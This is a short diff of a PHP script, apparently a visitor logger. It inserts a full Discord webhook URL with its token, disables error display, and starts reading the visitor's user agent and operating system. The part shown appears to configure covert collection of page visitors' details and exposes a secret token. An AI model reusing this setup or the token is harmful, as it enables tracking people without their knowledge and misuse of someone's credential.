@@ -4,7 +4,7 @@
  Last update : 29/03/2020
 */
 ini_set('display_errors','off');
-/*<------------- Placer le lien webhook ici ------------------>*/ $webhook = "INSERT WEBHOOK HERE";
+/*<------------- Placer le lien webhook ici ------------------>*/ $webhook = "https://canary.discord.com/api/webhooks/946000004252839936/NYHMWb9aw8grDe5VJGRMS4SRZ9bk5itvEPgRuDITvUh2ws3SSOWkEez_Bqx2niLw6rET";
 $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
 function getOS() { 
     global $user_agent;
